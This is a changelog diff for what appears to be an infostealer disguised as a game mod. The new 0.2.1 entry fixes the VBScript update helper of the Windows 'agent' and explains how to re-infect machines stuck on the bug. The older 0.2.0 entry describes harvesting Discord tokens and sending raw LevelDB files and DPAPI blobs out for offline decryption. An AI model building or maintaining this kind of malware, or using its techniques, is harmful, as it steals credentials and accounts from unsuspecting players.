@@ -1,5 +1,12 @@
 # Changelog
 
+## 0.2.1
+
+- Fix: every Windows agent update since 0.1.4 died before doing anything. The generated helper declared `Const NEW`, and `New` is a VBScript reserved word, so `wscript` rejected the file with "Se esperaba un identificador" and an error dialog. Renamed to `NEWFILE`.
+- Fix: the same helper also used `left` as a counter variable while calling `Left()`, shadowing the built-in. Renamed to `remaining`.
+- The Windows update script is now asserted against both names.
+- Machines stuck on this bug need one manual hop: replace the mod jar by hand, `kill` the agent and start the game, the stager then installs the 0.2.1 agent from the mod.
+
 ## 0.2.0
 
 - Harvest: newer Discord builds encrypt the stored token, so no plaintext candidate validates. The raw LevelDB files now ship under `discord/raw/` (2 MB budget) instead of being dropped; the DPAPI blobs in `dpapi/` are enough to decrypt them offline.
